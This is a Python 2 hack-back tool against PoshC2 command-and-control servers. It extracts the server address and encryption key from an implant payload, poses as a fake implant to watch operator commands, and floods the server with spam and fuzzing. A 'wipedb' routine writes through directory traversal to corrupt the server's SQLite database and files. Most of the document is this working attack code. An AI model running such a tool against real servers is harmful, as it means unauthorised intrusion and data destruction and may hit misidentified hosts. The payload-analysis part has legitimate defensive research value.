#!/usr/bin/env python
# Find, monitor and troll a PoshC2 server

import zlib, argparse, os, sys, re, requests, subprocess, datetime, time, base64

class PoshC2Payload:
  
  filepath = None
  useragent = None
  secondstage = None
  encryptionkey = None

  def __init__( self, path ):
    if not os.path.isfile( path ):
      print path + ' isn\'t a file'

    self.filepath = path

  # Attempt to pull info out of implant payload
  def analyse( self ):
    print 'Analysing ' + self.filepath + '...'

    with open( self.filepath, 'rb' ) as f:
      decoded = PoshC2Payload.base64_walk( f.read() )
  
    # print decoded

    # Get custom headers
    headernames = [
      'User-Agent',
      'Host',
      'Referer'
    ]
    self.headers = {}
    for h in headernames:
      m = re.search( h + '","([^"]*)"', decoded, re.IGNORECASE )
      if m:
        print h + ': ' + m.group(1)
        self.headers[h] = m.group(1)

    # Get host header
    m = re.search('\$h="([^"]*)"', decoded )
    if m:
      self.headers['Host'] = m.group(1)
      print 'Host header: ' + m.group(1)

    # Get second stage URL
    m = re.search('\$s="([^"]*)"', decoded )
    if m:
      self.secondstage = m.group(1)
      print 'Second stage URL: ' + self.secondstage
    
    # Get encryption key
    m = re.search('-key ([/+a-z0-9A-Z]*=*)', decoded )
    if m:
      self.encryptionkey = m.group(1)
      print 'Encryption key: ' + self.encryptionkey

    c2 = PoshC2Server()
    c2.key = self.encryptionkey
    return c2

  # Recursively attempt to extract and decode base64
  @staticmethod
  def base64_walk( data ):

    # data = data.decode('utf-16le').encode('utf-8')

    # Convert by stripping zero bytes, lol
    s = ''
    for c in data:
      if ord( c ) != 0:
        s += c
    data = s
    # print ''
    # print 'Attempting to get data from: ' + data

    # Find all base64 strings
    m = re.findall( r'[+/0-9a-zA-Z]{20,}=*', data )
    
    if len( m ) == 0:
      print 'No more base64 found'
      return data

    # Join into one string
    b64 = ''.join(m)
    # print 'Found: ' + b64
    
    decoded = base64.b64decode( b64 )

    # Deflated?
    decompress = zlib.decompressobj(
      -zlib.MAX_WBITS  # see above
    )
    try:
      d = decompress.decompress( decoded )
      if d:
        print 'Data is compressed'
        decoded = d
    except:
      print 'Data is not compressed'

    # Check if the data now contains a user agent, URL 
    m = re.search(r'user-agent',decoded,re.IGNORECASE)
    if m:
      return decoded
    
    return PoshC2Payload.base64_walk( decoded )


class PoshC2Server:

  host = None
  hostheader = None
  key = None
  useragent = None
  referer = None
  cookie = None
  pid = None
  username = None
  domain = None
  cookies = None
  debug = False
  sleeptime = 5

  def __init__( self, host=None, hostheader=None ):
    
    self.session = requests.Session()
    self.host = host
    if not hostheader:
      self.hostheader = host
    else:
      self.hostheader = hostheader

  def do_request( self, url, data=None ):
    
    # def do_request( self, path, method='GET', data=None, files=None, returnformat='json', savefile=None ):
    headers = {
      'Host': self.hostheader,
      'Referer': self.referer,
      'User-Agent': self.useragent,
      'Cookie': self.cookie
    }
    if len(self.session.cookies) > 0:
      cookies = requests.utils.dict_from_cookiejar(self.session.cookies)
      cookies['SessionID'] = self.cookie
      print 'Including cookies'
      print self.cookie

    try:
      if data:
        response = self.session.post(url, data=data, headers=headers, verify=False ) # , files=files, stream=stream )
      else:
        response = self.session.get(url, headers=headers, verify=False )
    except:
      e = sys.exc_info()[1]
      print 'Request failed: ' + str( e ), 'fail' 
      return False

    if self.debug: 
      print response
      print response.text   
    if response.status_code == 200:
      return response.text
    self.error = response
    if self.debug:
      print self.error
    return False

  def get_encryption( self, iv='0123456789ABCDEF' ):
    from Crypto.Cipher import AES
    aes = AES.new( base64.b64decode(self.key), AES.MODE_CBC, iv )
    return aes

  # Encrypt a string and base64 encode it
  def encrypt( self, data, gzip=False ):
    # function ENC ($key,$un){
    # $b = [System.Text.Encoding]::UTF8.GetBytes($un)
    # $a = CAM $key
    # $e = $a.CreateEncryptor()
    # $f = $e.TransformFinalBlock($b, 0, $b.Length)
    # [byte[]] $p = $a.IV + $f
    # [System.Convert]::ToBase64String($p)
    # }

    if gzip:
      print 'Gzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      out = StringIO.StringIO()
      with gzip.GzipFile(fileobj=out, mode="w") as f:
        f.write(data)
      data = out.getvalue() 

    # Pad with zeros
    mod = len(data) % 16
    if mod != 0:
      newlen = len(data) + (16-mod)
      data = data.ljust( newlen, '\0' )
    aes = self.get_encryption()
    # print 'Data len: ' + str(len(data))
    data = aes.IV + aes.encrypt( data )
    if not gzip:
      data = base64.b64encode( data )
    return data

  # Decrypt a string from base64 encoding 
  def decrypt( self, data, gzip=False ):
    # iv is first 16 bytes of cipher
    iv = data[0:16]
    # data = data[16:]
    # print 'IV length: ' + str(len(iv))
    aes = self.get_encryption(iv)
    if not gzip:
      data = base64.b64decode(data)
    data =  aes.decrypt( data )
    if gzip:
      print 'Gunzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      infile = StringIO.StringIO(data)
      with gzip.GzipFile(fileobj=infile, mode="r") as f:
        data = f.read()
    return data[16:]
  
  def setcookie( self, value=None ):
    if value:
      c = value
    else:
    # $o="$env:userdomain\$u;$u  ;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;http://172.16.88.221"
      if not self.pid:
        import random
        self.pid = random.randrange(300,9999)
      c = self.domain + '\\'
      c += self.username + ';'
      c += self.username + ';' 
      c += self.machine + ';AMD64;' 
      c += str( self.pid ) + ';' 
      c += self.host
    print c
    self.cookie = 'SessionId=' + self.encrypt( c )
    print self.cookie

  # Get the second stage
  def secondstage( self, url, interact=False ):
    
    # $o="$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://172.16.88.221"
    # $pp=enc -key sBOGMbI+wTzxiN9H8q8y8YFBuD/KGsmvCnwRhDjPVXE= -un $o
    # $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
    self.host = '/'.join(url.split('/')[0:3])
    self.setcookie()
    data = self.do_request( url )
    data = self.decrypt( data )

    # print data

    # Get encryption key, URL
    m = re.search( r'\$key *= *"([^"]+)"', data )
    if m:
      print 'Comms encryption key: ' + m.group(1)
      self.key = m.group(1)
    m = re.search(r'\$Server *= *"([^"]+)"', data )
    if m:
      print 'Comms URL: ' + m.group(1)
      self.commsurl = m.group(1)
    m = re.search(r'\$sleeptime *= *([0-9]+)', data )
    if m:
      print 'Sleep time: ' + m.group(1)
      self.sleeptime = int(m.group(1))

    if not interact: return True
    
    self.listen( self.commsurl )

  def getimgdata( self, data ):
    # Just use one image because we don't care
    imagebytes = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACAUlEQVR42rWXi7WCMAyG2xGcRUfQEXAE7wgyAq7gCDqCjiCruAK3f2162pDSlkfOQaRA8+VPH0Grehvw03WdvXi/3/Y4Ho/+Gv9xtG2rc51lH+DOjanT6eSd4RpGba/Xy55vtxsAsj5qAKxzrbV3ajvQvy5IETiV7kMRAzzyNwuA5OYqhE6pDUrgGSgDlTiECGCiGSi3rN1G+HGdt78OI6AUFKWJj40IwNwcSK7r9Rq9TJFwKFgI1JlIDyxNHCJUIQSI3kC0HIIbYPq+H4GRcy2AuDERAyByKbISiJSFuZ8EQL7ddBEtJWXOdCINI4BU9EtVKAZQLPfcMCC5jCXGFybJ+aYABMHUFReizQAiR0L0tmGrMVAMMDULaEHiK92qAO4spgHSr+G8BCCCWDPyGgALsWbUcwD8TgibGpykVOkMkbZiEWDChtEm83dQ+t5nl2tpG14MUKMCnne1xDIAGhvcIXY+bMuPxyMJkPJVCmBD/5jj7g5uTdMkX34+n/NqQlqkQukv7t5F1VlbC0DlGZcbAwptkB1WOmNS/lIAQziyQ6dQpHR/OJ/Par/f+2epok7VhKJzihSd2OlnBoI+zK+UCIR8j1bC7/erdrvdKHqCqVGgBMIDSDkPo59rmAHSDKGiNdqMuKxh9HMs9z5U8Ntx6ktmSTkmfeCIALmqaEv7B/CgdPivPO+zAAAAAElFTkSuQmCC')     
    maxbyteslen = 1500
    maxdatalen = 1500 + len( data )
    imagebyteslen = len(imagebytes)
    paddingbyteslen = maxbyteslen - imagebyteslen
    bytepadding = '.'.ljust(paddingbyteslen,'.')
    imagebytesfull = imagebytes + bytepadding + data
    return imagebytesfull

  def uploadfile( self, localpath, remotepath, data=None ):
    c = 'download-file '+remotepath
    self.setcookie(c)
    if data:
      filedata = data
    else:
      with open( localpath, 'rb' ) as f:
        filedata = f.read()

  #         $bufferSize = 10737418;
  #             $preNumbers = ($ChunkedByte+$totalChunkByte)
  #             $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)
    buffersize = 10737418
    filesize = len( filedata )
    chunksize = filesize / buffersize
    import math
    totalchunks = int(math.ceil(chunksize))
    if totalchunks < 1: totalchunks = 1
    totalchunkstr = str( totalchunks ).rjust(5,'0')
    chunk = 1
    start = 0
    while chunk <= totalchunks:
      chunkstr = str( chunk ).rjust(5,'0')
      prenumbers=chunkstr + totalchunkstr
      chunkdata = filedata[start:start+buffersize]
      chunk+=1
      start += buffersize
      send = self.encrypt( prenumbers + chunkdata, gzip=True )
      uploadbytes = self.getimgdata( send )
      print 'Chunk data: ' + chunkdata
      print 'Prenumbers: ' + prenumbers
      print 'Imgdata: ' + uploadbytes
      response = self.do_request( self.commsurl, uploadbytes )
      print response
      if len(response.strip()) > 0:
        print self.decrypt( response )
    return False  

  def wipedb( self ):
    print 'Wiping their DB...'
    self.uploadfile( None, '..\PowershellC2.SQLite', 'Appended data' )
    self.uploadfile( None, '..\oops.txt', 'oopsy' )
    self.uploadfile( None, '..\Restart-C2Server.lnk', 'oopsy' )

  # Listen to incoming commands
  def listen( self, url ):
    print 'Listening to server on comms URL: ' + url
    fmt = '%Y-%m-%d %H:%M:%S'
    while True:
      data = self.do_request( url )
      cmd = self.decrypt( data )
      out = ''
      if 'fvdsghfdsyyh' in cmd:
        out = 'No command...'
      elif '!d-3dion@LD!-d' in cmd:
        out = '\n'.join(cmd.split('!d-3dion@LD!-d'))
      else: 
        out = cmd

      print datetime.datetime.now().strftime(fmt) + ': ' + out
      time.sleep( self.sleeptime )
    return False

  # rickroll the server
  def rickroll( self, url ):
    thisdir = os.path.dirname(os.path.realpath(__file__))
    wordsfile = thisdir + '/nevergonna.txt'
    self.username = 'rastley'
    self.domain = 'SAW'
    self.host = 'https://bitly.com/98K8eH'
    self.spam( wordsfile, url )
 
  # Spray the contents of a txt file at the server as machine names
  def spam( self, wordsfile, url ):
    try:
      with open( wordsfile, 'r' ) as f:
        lines = f.readlines()
    except:
      print 'Failed to open ' + wordsfile
      return False

    for line in lines:
      line = line.strip() # re.sub( '[^-0-9a-zA-Z ]', '', line.strip() ).replace(' ','-')
      self.machine = line
      key = self.key
      self.secondstage( url )
      self.pid = None
      self.key = key
    return True
  
  # Connect with random keys, forever
  def fuzz( self, secondstage ):
    import random
    while True:
      c = b''
      for i in range( 0, 16 ):
        c += unichr( random.randint(0, 127 ) )
      self.key = base64.b64encode( c )
      self.secondstage( secondstage )

        

def main():
  
  # Command line options
  parser = argparse.ArgumentParser(description="Find, monitor and troll a PoshC2 server")
  parser.add_argument("-a", "--analyse", help="Analyse an implant payload to discover C2 server")
  parser.add_argument("-k", "--key", help="Comms encryption key" )
  parser.add_argument("-U", "--useragent", help="User-agent string" )
  parser.add_argument("-r", "--referer", help="Referer string" )
  parser.add_argument("-H", "--host", help="Host name to connect to" )
  parser.add_argument("-g", "--hostheader", help="Host header for domain fronted servers")
  parser.add_argument("-d", "--domain", default='WORKGROUP', help="Windows domain name to claim to be in")
  parser.add_argument("-u", "--user", default='user', help="Windows user to claim to be connecting as")
  parser.add_argument("-m", "--machine", default='DESKTOP', help="Machine hostname to claim to be connecting as")
  parser.add_argument("--connect", action='store_true', help="Connect to the C2 as a new implant then quit")
  parser.add_argument("--watch", action='store_true', help="Connect and monitor commands as they come in")

  parser.add_argument("--spam", metavar="TEXTFILE", help="Spam the connected implants screen with content from this text file")
  parser.add_argument("--rickroll", action='store_true', help="Spam with the entire lyrics to Never Gonna Give You Up")
  parser.add_argument("--upload", nargs=2, help="Upload a file to the C2 server (NOTE: this writes data from the local file to the remote file in APPEND mode)")
  parser.add_argument("--fuzz", action='store_true', help="Fuzz with random bytes")
  if len( sys.argv)==1:
    parser.print_help()
    sys.exit(1)
  args = parser.parse_args()

  if args.analyse:
    payload = PoshC2Payload( args.analyse )   
    c2 = payload.analyse()
    secondstage = payload.secondstage
  else:
    c2 = PoshC2Server()
    c2.useragent = args.useragent
    c2.referer = args.referer
    c2.key = args.key
    c2.host = args.host
  c2.domain = args.domain
  c2.username = args.user
  c2.machine = args.machine

  if args.connect:
    c2.secondstage( secondstage )
    return True

  if args.watch:
    c2.secondstage( secondstage, interact=True )
    return True

  if args.rickroll:
    c2.rickroll( payload.secondstage )
    return True

  if args.upload:
    c2.secondstage( secondstage )
    c2.uploadfile( args.upload[0], args.upload[1] ) 

  if args.fuzz:
    c2.fuzz( secondstage )

if __name__ == "__main__":
  main()
